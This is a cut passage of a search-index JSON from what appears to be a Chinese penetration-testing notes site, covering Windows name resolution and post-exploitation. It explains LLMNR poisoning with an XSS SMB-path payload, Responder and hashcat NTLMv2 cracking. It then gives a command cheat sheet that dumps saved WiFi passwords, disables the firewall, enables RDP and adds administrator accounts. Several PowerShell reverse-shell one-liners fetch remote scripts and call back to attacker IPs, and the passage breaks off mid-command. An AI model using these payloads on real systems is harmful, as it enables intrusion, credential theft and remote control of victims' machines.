2.\u82e5\u672c\u5730\u6ca1\u6709\u5bf9\u5e94\u7684\u540d\u79f0\u8bb0\u5f55\uff0c\u5219\u8bf7\u6c42\u7f51\u7edc\u914d\u7f6e\u7684DNS\u670d\u52a1\u5668 3.\u82e5DNS\u670d\u52a1\u5668\u4e5f\u6ca1\u6709\u5bf9\u5e94\u54cd\u5e94\uff0c\u5219DNS\u8d28\u8be2\u5931\u8d25\u3002","title":"\u5de5\u4f5c\u673a\u7406"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/#netbios","text":"netbois \u76d1\u542c\u7aef\u53e3\u4e3a UDP/137,\u5b83\u4e0d\u652f\u6301IPV6\uff0c\u5b83\u4e0eDNS\u7684\u4e0d\u540c\u662f\u5b83\u9664\u4e86\u901a\u8fc7\u7279\u5b9a\u670d\u52a1\u5668\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5e7f\u64ad\u6765\u8fdb\u884c\u540d\u79f0\u89e3\u6790\u3002","title":"NETBIOS"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/#h-","text":"1.\u68c0\u67e5\u672c\u5730NetBois\u7f13\u5b58\uff0c\u6709\u7f13\u5b58\u5219\u5b8c\u6210\u540d\u79f0\u89e3\u6790\u3002\uff08\u4f7f\u7528nbtstat -c\u547d\u4ee4\u67e5\u770b\u672c\u673a\u7684 NetBIOS \u7f13\u5b58\uff09 2.\u82e5\u65e0\u7f13\u5b58\uff0c\u4e14\u914d\u7f6e\u4e86WINS\u670d\u52a1\u5668\uff0c\u5219\u901a\u8fc7WINS\u670d\u52a1\u5668\u6765\u8fdb\u884c\u540d\u79f0\u89e3\u6790\uff08\u548cDNS\u670d\u52a1\u5668\u5f88\u50cf\uff09 3.\u82e5\u6ca1\u6709WINS\u670d\u52a1\u5668\u6216\u8005WINS\u670d\u52a1\u5668\u65e0\u54cd\u5e94\uff0c\u5219\u5411\u5f53\u524d\u7f51\u6bb5\u53d1\u9001\u5e7f\u64ad\u8fdb\u884c\u8d28\u8be2\uff08\u548cARP\u6709\u70b9\u50cf\uff09\uff0c\u82e5\u6709\u4e3b\u673a\u54cd\u5e94\u5219\u5b8c\u6210\u540d\u79f0\u89e3\u6790 4.\u82e5\u5e7f\u64ad\u540e\u65e0\u4efb\u4f55\u4e3b\u673a\u54cd\u5e94\uff0c\u5219\u8bfb\u53d6\u672c\u5730Imhosts\u6587\u4ef6\uff0c\u5176\u5b58\u5728\u4e8eC:\\Windows\\System32\\drivers\\etc\\\uff0c\uff08\u548cDNS\u672c\u5730\u67e5\u8be2\u5f88\u50cf\uff09","title":"\u5de5\u4f5c\u673a\u7406\uff08H-\u8282\u70b9\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/#_4","text":"NETBIOS\u7684\u5b9e\u9645\u5de5\u4f5c\u60c5\u51b5\u5e76\u4e0d\u662f\u50cf\u521a\u521a\u8bf4\u7684\u90a3\u4e48\u6b7b\u677f\uff0c\u5b9e\u9645\u4e0a\uff0cNETBIOS\u540d\u79f0\u89e3\u6790\u6709\u56db\u79cd\u4e0d\u540c\u7684\u5de5\u4f5c\u987a\u5e8f. B-\u8282\u70b9(broadcast\uff0c\u5e7f\u64ad) \u5f53 Windows \u5c1d\u8bd5\u89e3\u6790\u540d\u79f0\u65f6\uff0c\u9996\u5148\u68c0\u67e5 NetBois\u7f13\u5b58\uff0c\u5982\u679c\u6b64\u884c\u4e0d\u901a\uff0cWindows \u5c31\u4f1a\u53d1\u9001\u5e7f\u64ad\uff0c\u5982\u679c\u5e7f\u64ad\u4f9d\u7136\u5931\u8d25\u7684\u8bdd\uff0c\u90a3Windows \u624d\u4f1a\u68c0\u67e5\u5b9e\u9645\u7684 LMHOSTS \u6587\u4ef6\u3002 P-\u8282\u70b9(per-to-per\uff0c\u5bf9\u7b49) \u8fd9\u79cd\u65b9\u6cd5\u5e76\u4e0d\u4f7f\u7528\u5e7f\u64ad\uff0c\u800c\u662f\u5728\u8ba1\u7b97\u673a\u542f\u52a8\u65f6\uff0c\u5728\u7f51\u7edc\u4e2d\u7684 WINS \u670d\u52a1\u5668\u4e0a\u6ce8\u518c\u5b83\u4eec\u7684\u540d\u79f0\uff0c\u5f53\u8ba1\u7b97\u673a\u9700\u8981\u89e3\u6790\u540d\u79f0\u65f6\uff0c\u5b83\u4f1a\u53d1\u9001\u4e00\u4e2a\u89e3\u6790\u8bf7\u6c42\u7ed9 WINS \u670d\u52a1\u5668\u3002\u8fd9\u79cd\u65b9\u6cd5\u53ea\u5728 WINS \u670d\u52a1\u5668\u6b63\u5e38\u8fd0\u884c\u65f6\u6709\u6548\uff0c\u5982\u679c WINS \u670d\u52a1\u5668\u5931\u8d25\uff0c\u5219\u65e0\u6cd5\u8fdb\u884c\u540d\u79f0\u89e3\u6790\u3002 M-\u8282\u70b9(mixed\uff0c\u6df7\u5408) Windows \u8054\u5408\u4f7f\u7528 B \u8282\u70b9\u548c P \u8282\u70b9\uff0c\u5e76\u4e14\u9ed8\u8ba4\u4f7f\u7528 B \u8282\u70b9\uff0c\u5982\u679c M \u8282\u70b9\u4e0d\u80fd\u5229\u7528\u5e7f\u64ad\u8fdb\u884c\u540d\u79f0\u89e3\u6790\uff0c\u5b83\u5c31\u4f7f\u7528 P \u8282\u70b9\u7684 WINS \u670d\u52a1\u5668\u6765\u5b8c\u6210\u5de5\u4f5c\u3002 H-\u8282\u70b9(hybrid\uff0c\u6df7\u5408) \u540c\u6837\u4e5f\u662f\u8054\u5408\u4f7f\u7528 B \u8282\u70b9\u548c P \u8282\u70b9\uff0c\u4f46\u5de5\u4f5c\u65b9\u5f0f\u76f8\u53cd\uff0c\u5982\u679c\u4f7f\u7528 WINS \u670d\u52a1\u5668\u65b9\u5f0f\u4e0d\u80fd\u6210\u529f\uff0c\u5219\u4f7f\u7528 B \u8282\u70b9\u7684\u5de5\u4f5c\u6765\u5b8c\u6210\u5de5\u4f5c\u3002\u6b64\u8282\u70b9\u6a21\u5f0f\u4e5f\u662f \u76ee\u524d Windows \u7cfb\u7edf\u9ed8\u8ba4\u4f7f\u7528\u7684\u8282\u70b9\u6a21\u5f0f \u3002 \u8282\u70b9\u6a21\u5f0f\u53ef\u4ee5\u5728ipconfig /all \u7684\u8282\u70b9\u7c7b\u578b\u5904\u770b\u5230\u3002","title":"\u8282\u70b9\u7c7b\u578b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/#llmnr","text":"LLMNR\u4e0d\u4f9d\u8d56\u4e8e\u4efb\u4f55\u72ec\u7acb\u670d\u52a1\u5668 ,\u5b83\u4ec5\u9760\u591a\u64ad\u6765\u5b9e\u73b0\u540d\u79f0\u89e3\u6790\u3002\u5b83\u518dWindows Vista\u7248\u672c\u4e4b\u540e\u51fa\u73b0\u3002 \u5b83\u53c8\u88ab\u79f0\u4f5c\u201c\u591a\u64adDNS\u201d\uff0c\u76d1\u542c\u7aef\u53e3\u4e3a UDP/5355","title":"LLMNR"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/#_5","text":"1.\u68c0\u67e5NetBios\u7f13\u5b58\u3002 2.\u82e5\u65e0\u7f13\u5b58\uff0c\u5219\u5411\u5f53\u524d\u7f51\u57df\u53d1\u9001\u5e7f\u64ad\u3002 3.\u82e5\u6709\u4e3b\u673a\u54cd\u5e94\uff0c\u5219\u89e3\u6790\u6210\u529f\u3002\u53cd\u4e4b\u5219\u4e0d\u6210\u529f\u3002","title":"\u5de5\u4f5c\u673a\u7406"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/#_6","text":"","title":"\u9488\u5bf9\u540d\u79f0\u89e3\u6790\u7684\u653b\u51fb\u65b9\u6cd5"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/#llmnr_1","text":"\u4e0b\u56fe\u4e3aLLMNR\u7684\u6b63\u5e38\u6d41\u7a0b \u88ab\u6bd2\u5316\u540e \u5b9e\u9645\u4e0aLLMNR\u6295\u6bd2\u5e76\u4e0d\u590d\u6742\uff0c\u65e0\u975e\u5c31\u662f\u5e94\u7b54LLMNR\u8bf7\u6c42\u5305\u4ece\u800c\u5192\u5145\u81ea\u5df1\u4e3a\u53e6\u4e00\u53f0\u4e3b\u673a\u3002 \u5728\u5185\u7f51\u73af\u5883\u4e2d\u8bf8\u591a\u540d\u79f0\u89e3\u6790\u670d\u52a1\u90fd\u662f\u901a\u8fc7DNS\u5b8c\u6210\u7684\uff0c\u53ea\u6709\u5c11\u6570\u5982SMB\u5171\u4eab\u548cping\u8fd8\u6709\u8fdc\u7a0b\u8fde\u63a5\uff08win10\u4f1a\u5148\u901a\u8fc7DNS\u8fdb\u884c\u89e3\u6790\uff0cDNS\u89e3\u6790\u5931\u8d25\u624d\u4f1a\u4f7f\u7528LLMNR\uff09\u4f1a\u4f7f\u7528LLMNR\u8fdb\u884c\u540d\u79f0\u89e3\u6790\u3002 smb\u8bf7\u6c42\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684smb\u5730\u5740\uff0c\u89e6\u53d1LLMNR\u540d\u79f0\u89e3\u6790(win10) \u8fdc\u7a0b\u8fde\u63a5\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u4e3b\u673a\uff0c\u89e6\u53d1LLMNR\u540d\u79f0\u89e3\u6790\uff08WIN10 LLMNR\u6295\u6bd2\u7684\u4e3b\u8981\u653b\u51fb\u65b9\u5f0f\u5c31\u662f\u901a\u8fc7\u5728\u67d0\u4e00\u673a\u5668\u53d1\u8d77SMB\u8bf7\u6c42\u65f6\u8fdb\u884c\u5192\u5145\uff0c\u622a\u83b7\u76ee\u6807\u5728SMB\u901a\u4fe1\u4e2d\u53d1\u9001\u7684hash\u5e76\u8fdb\u884c\u89e3\u5bc6\uff0c\u4ece\u800c\u83b7\u53d6\u7528\u6237\u7684\u5bc6\u7801hash\u3002 \u6216\u8005\u5192\u5145WEB\u670d\u52a1\u5668\u8fdb\u884c\u9493\u9c7c\uff08\u7531\u4e8e\u76ee\u524dLLMNR\u89e3\u6790\u5f80\u5f80\u53ea\u7528\u4e8eSMB\u548cICMP\u8fd8\u6709RDP\uff0c\u6240\u4ee5\u4e0eHTTP\u6cbe\u8fb9\u7684\u65b9\u6cd5\u5f88\u96be\u7528\u5230\uff09\u3002","title":"LLMNR \u6295\u6bd2"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/#smbhash","text":"\u6211\u4eec\u6709\u5fc5\u8981\u4e86\u89e3\u4e00\u4e0b\uff0cSMB\u7684\u5de5\u4f5c\u673a\u5236\u3002 \u5b9e\u9645\u4e0aSMB\u5728\u786e\u8ba4\u5bf9\u65b9\u8eab\u4efd\u65f6\uff0c\u7528\u7684\u662fNTLM\u534f\u8bae\u3002 \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7xss\u5411\u4e00\u4e2aweb\u9875\u9762\u4e2d\u63d2\u5165\u50cf\u8fd9\u6837\u7684\u4ee3\u7801 <img src=\\\\test\\1.jpg> \u5176\u4e2dtest\u8fd9\u4e00\u4e2aSMB\u540d\u79f0\u5b9e\u9645\u4e0a\u662f\u4e0d\u5b58\u5728\u7684\uff0c\u6545\u8bbf\u95ee\u8be5\u9875\u9762\u7684\u4e3b\u673a\u4f1a\u901a\u8fc7LLMNR\u53bb\u5e7f\u64ad\u89e3\u6790\u8fd9\u4e2a\u540d\u79f0\u5bf9\u5e94\u7684IP\u3002\u6211\u4eec\u8fd9\u4e2a\u65f6\u5019\u5c06\u5176\u52ab\u6301\uff0c\u56de\u5e94\u8bf4\u81ea\u5df1\u4fbf\u662ftest\uff0c\u63a5\u4e0b\u6765\u5c31\u4f1a\u8fdb\u5165\u5230SMB\u7684\u8eab\u4efd\u9a8c\u8bc1\u73af\u8282\uff1a\u6211\u4eec\u5411\u53d1\u9001SMB\u8bf7\u6c42\u7684\u673a\u5668\u53d1\u9001\u4e00\u4e2achallenge\uff0c\u5bf9\u65b9\u4fbf\u4f1a\u8fd4\u56de\u4e00\u4e2a\u5176\u7528\u81ea\u5df1HASH\u52a0\u5bc6\u7684\u52a0\u5bc6\u5b57\u7b26\u4e32response\uff08\u4e5f\u5c31\u662fNTLMv2\uff09\u8fc7\u6765\u3002\u6211\u4eec\u62ff\u5230response\u540e\u901a\u8fc7\u7206\u7834\u5de5\u5177\u8fdb\u884c\u7206\u7834\u5176\u5bc6\u94a5\uff0c\u4fbf\u6709\u7206\u7834\u51fa\u5176CLIENT HASH\u7684\u53ef\u80fd\u6027\u3002 \u6211\u4eec\u7528responder\u8fdb\u884c\u6bd2\u5316\uff0c\u5728\u7528\u6237\u8bbf\u95ee\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684SMB\u8def\u5f84\u65f6\u8fdb\u884cLLMNR\u5e94\u7b54\uff0c\u53d1\u9001challenge\uff1a1122334455667788\u5e76\u622a\u83b7\u5176NTLMv2 \u968f\u540e\u5c06NTLMv2-SSP HASH\u590d\u5236\u5230\u4e00\u4e2a\u6587\u4ef6\u4e2d\uff0c\u5c06\u7206\u7834\u7684\u5bc6\u7801\u5217\u8868\u653e\u5165\u53e6\u4e00\u4e2a\u6587\u4ef6\u4e2d\u3002 hashcat -m 5600 hash.txt password.txt \u6210\u529f\u7206\u7834\u51fa","title":"SMB\u7206\u7834hash"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/","text":"windows\u5185\u7f51\u6e17\u900f\u5e38\u7528\u547d\u4ee4\u603b\u6c47 \u76ee\u5f55 \u6b63\u6587 \u67e5\u8be2\u7f51\u7edc\u914d\u7f6e\u4fe1\u606f \u67e5\u8be2\u672c\u673a\u7684\u670d\u52a1\u4fe1\u606f \u67e5\u8be2\u7cfb\u7edf\u4fe1\u606f \u8fde\u63a5\u8fc7\u7684WIFI\u53ca\u5bc6\u7801 \u67e5\u8be2\u8fdb\u7a0b\u5217\u8868 \u67e5\u770b\u8ba1\u5212\u4efb\u52a1 \u67e5\u770b\u4e3b\u673a\u5f00\u673a\u65f6\u95f4 \u7528\u6237\u76f8\u5173 \u67e5\u770b\u7aef\u53e3\u5217\u8868 \u67e5\u770b\u5df2\u6253\u8865\u4e01 \u67e5\u770b\u5171\u4eab\u5217\u8868 \u8def\u7531\u8868\u548carp\u9ad8\u901f\u7f13\u5b58\u8868 \u9632\u706b\u5899 \u6743\u9650\u67e5\u770b \u5224\u65ad\u662f\u5426\u5b58\u5728\u57df \u67e5\u770b\u57df\u7684\u540d\u5b57 \u63a2\u6d4b\u57df\u5185\u5b58\u6d3b\u4e3b\u673a \u626b\u63cf\u57df\u5185\u5f00\u653e\u7aef\u53e3 \u57df\u5185\u57fa\u672c\u4fe1\u606f \u57df\u7528\u6237\u4fe1\u606f\u6536\u96c6 \u672c\u673awmic\u67e5\u6740\u8f6f \u5f003389 \u7528\u6237\u589e\u5220\u6539\u67e5 \u4e00\u4e9b\u559c\u6b22\u7528\u7684 ps cs \u4e0a\u7ebf \u67e5\u770b\u5f00\u673a\u81ea\u542f \u83b7\u53d6\u9065\u6d4b\u4efb\u52a1 \u53cd\u75c5\u6bd2\u68c0\u6d4b \u7b80\u5355\u7684\u6c99\u76d2&\u865a\u62df\u673a\u68c0\u6d4b \u6b63\u6587 \u524d\u51e0\u5929\u9762\u8bd5\u7684\u65f6\u5019\u88ab\u5e08\u5085\u95ee\u5230\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u5f53\u65f6\u4e0d\u662f\u5f88\u4f1a\uff0c\u73b0\u5728\u6765\u5b66\u5b66 \u67e5\u8be2\u7f51\u7edc\u914d\u7f6e\u4fe1\u606f ipconfig /all \u67e5\u8be2\u672c\u673a\u7684\u670d\u52a1\u4fe1\u606f wmic service list brief \u67e5\u8be2\u7cfb\u7edf\u4fe1\u606f systeminfo \u8fde\u63a5\u8fc7\u7684WIFI\u53ca\u5bc6\u7801 for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear \u67e5\u8be2\u8fdb\u7a0b\u5217\u8868 tasklist / wmic process list brief \u67e5\u770b\u8ba1\u5212\u4efb\u52a1 schtasks /query /fo LIST /v \u5217\u51fa\u8ba1\u5212\u4efb\u52a1\u8be6\u7ec6\u4fe1\u606f \u67e5\u770b\u4e3b\u673a\u5f00\u673a\u65f6\u95f4 net statistics workstation \u7528\u6237\u76f8\u5173 net user \u67e5\u770b\u6240\u6709\u7528\u6237 net localgroup administrators \u83b7\u53d6\u672c\u5730\u7ba1\u7406\u5458\u4fe1\u606f \u67e5\u770b\u7aef\u53e3\u5217\u8868 netstat -ano \u67e5\u770b\u5df2\u6253\u8865\u4e01 wmic qfe get Caption,Description,HotFixID,InstalledOn \u67e5\u770b\u5171\u4eab\u5217\u8868 net share \u67e5\u770b\u672c\u673a\u5171\u4eab\u5217\u8868\u548c\u53ef\u8bbf\u95ee\u7684\u57df\u5171\u4eab\u5217\u8868 wmic share get name,path,status \u67e5\u627e\u5171\u4eab\u5217\u8868 \u8def\u7531\u8868\u548carp\u9ad8\u901f\u7f13\u5b58\u8868 route print \u8def\u7531\u8868 arp -a arp\u9ad8\u901f\u7f13\u5b58\u8868 \u9632\u706b\u5899 netsh firewall set opmode disable \u5173\u95ed\u9632\u706b\u5899(Windows Server 2003 \u4ee5\u524d\u7684\u7248\u672c) netsh advfirewall set allprofiles state off \u5173\u95ed\u9632\u706b\u5899(Windows Server 2003 \u4ee5\u540e\u7684\u7248\u672c) netsh firewall show config \u67e5\u770b\u9632\u706b\u5899\u914d\u7f6e \u5982\u679c\u4e0a\u9762\u7684\u547d\u4ee4\u88ab\u5f03\u7528\uff0c\u5219\u4f7f\u7528 netsh advfirewall firewall show rule name=all \u6839\u636e\u53c2\u8003\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2awmic\u4e00\u952e\u83b7\u53d6\u672c\u673a\u4fe1\u606f http://www.fuzzysecurity.com/scripts/files/wmic_info.rar \u6743\u9650\u67e5\u770b whoami /all \u67e5\u770b\u81ea\u5df1\u7684\u8be6\u7ec6\u6743\u9650 net user xxx /domain \u67e5\u770b\u57df\u5185\u6307\u5b9a\u7528\u6237\u7684\u6743\u9650 \u5224\u65ad\u662f\u5426\u5b58\u5728\u57df .net time /domain \u82e5\u51fa\u73b0\u4ee5\u4e0b\u60c5\u51b5\u5219\u4e0d\u5b58\u5728\u57df \u82e5\u662f\u62a5\u9519\uff1a\u53d1\u751f\u7cfb\u7edf\u9519\u8bef5\uff0c\u5219\u5b58\u5728\u57df\uff0c\u4f46\u8be5\u7528\u6237\u4e0d\u662f\u57df\u7528\u6237 \u82e5\u662f\u4ee5\u4e0b\u60c5\u51b5\u5219\u8bf4\u660e\u5b58\u5728\u57df\u4e14\u5df2\u7ecf\u5728\u57df\u4e2d \u67e5\u770b\u57df\u7684\u540d\u5b57 net config workstation nslookup -type=srv ldap. tcp \u8fd9\u4e2a\u5f88\u723d\uff0c\u57df\u63a7\u4e3b\u673a\u540d\u548cIP\u4e00\u5757\u5f04\u51fa\u6765\u4e86 \u63a2\u6d4b\u57df\u5185\u5b58\u6d3b\u4e3b\u673a 1.\u4f7f\u7528\u5de5\u5177 nbtscan http://www.unixwiz.net/tools/nbtscan.html 2.\u67e5\u770barp\u9ad8\u901f\u7f13\u5b58\u8868 arp -a 3.ICMP\u534f\u8bae\u63a2\u6d4b\uff08\u9010\u4e2aping\uff09 \u8fd9\u4e2a\u8d3c\u6162\uff0c\u4f46\u662f\u4e0d\u7528\u4e0b\u8f7d\u5176\u4ed6\u5e94\u7528 for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr \"TTL\" 4.nmap\u76f4\u63a5\u5f00\u626b 5.meterpreter\u4f1a\u8bdd\u4e2d\u6267\u884c run windows/gather/enum_ad_computers \u626b\u63cf\u57df\u5185\u5f00\u653e\u7aef\u53e3 1.nmap nmap 192.168.1.0/24 2.\u5de5\u5177 S\u626b\u63cf\u5668 3.\u81ea\u5199\u811a\u672c #python3 \u6162\u7684\u4e00\u6279 import socket def get_ip_status(ip,port): server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: server.connect((ip,port)) print('{0} port {1} is open'.format(ip, port)) except Exception as err: print('{0} port {1} is not open'.format(ip,port)) finally: server.close() if __name__ == '__main__': host = '172.16.0.198' for port in range(20,100): get_ip_status(host,port) \u57df\u5185\u57fa\u672c\u4fe1\u606f net group \u201cdomain computers\u201d /domain \u67e5\u8be2\u6240\u6709\u57df\u6210\u5458\u8ba1\u7b97\u673a\u5217\u8868 net view /domain:HACHE \u67e5\u8be2\u57df\u5185\u6240\u6709\u4e3b\u673a net accounts /domain \u83b7\u53d6\u57df\u5bc6\u7801\u4fe1\u606f nltest /domain_trusts \u83b7\u53d6\u57df\u4fe1\u4efb\u4fe1\u606f nltest /DCLIST:hacke \u67e5\u770b\u57df\u63a7\u5236\u5668\u673a\u5668\u540d Nslookup -type=SRV_ldap._tcp \u67e5\u770b\u57df\u63a7\u5236\u5668\u7684\u4e3b\u673a\u540d \u57df\u7528\u6237\u4fe1\u606f\u6536\u96c6 net user /domain \u5411\u57df\u63a7\u5236\u5668\u67e5\u8be2\u57df\u5185\u7528\u6237\u5217\u8868 wmic useraccount get /all \u83b7\u53d6\u57df\u5185\u7528\u6237\u8be6\u7ec6\u4fe1\u606f net localgroup administrators \u67e5\u8be2\u672c\u5730\u7ba1\u7406\u5458\u7528\u6237 net group \u201cdomain admins\u201d /domain \u67e5\u8be2\u57df\u7ba1\u7406\u5458\u7528\u6237 net group \u201cEnterprise admins\u201d /domain \u67e5\u8be2\u7ba1\u7406\u5458\u7528\u6237\u7ec4 \u672c\u673awmic\u67e5\u6740\u8f6f WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List or WMIC /namespace:\\root\\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe \u5f003389 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u201d \u201cServer /v fDenyTSConnections /t REG_DWORD /d 0 /f \u7528\u6237\u589e\u5220\u6539\u67e5 net user username password /add \u52a0\u7528\u6237 net localgroup administrators username /add \u6dfb\u52a0XX\u5230\u7ba1\u7406\u5458\u8d26\u6237 \u4e00\u4e9b\u559c\u6b22\u7528\u7684 Windows \u53cd\u5f39shell powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.4 -p 9999 -e cmd powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.203.140 -port 6666 NISHANG\u91cc\u9762\u62a0\u7684 \uff08\u4e5e\u4e10\u7248\uff09 $sm=(New-Object Net.Sockets.TCPClient(\"192.168.254.1\",55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} \uff08\u8c6a\u534e\u7248\uff09 $client = New-Object System.Net.Sockets.TCPClient(\"192.168.254.1\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() (cmd\u4e13\u7248) rundll32.exe javascript:\"\"\\..\\mshtml,RunHTMLApplication \"\";document.write();r=new%20ActiveXObject(\"\"WScript.Shell\"\").run(\"\"powershell -w h -ep bypass `$sm=(New-Object Net.Sockets.TCPClient('$IPAddress',$Port)).GetStream();[byte[]]`$bt=0..65535|%{0};while((`$i=`$sm.Read(`$bt, 0, `$bt.Length)) -ne 0){;`$d=(New-Object Text.ASCIIEncoding).GetString(`$bt,0, `$i);`$sb=(iex `$d 2>&1 | Out-String );`$sb2=`$sb + 'PS ' + (pwd).Path + '> 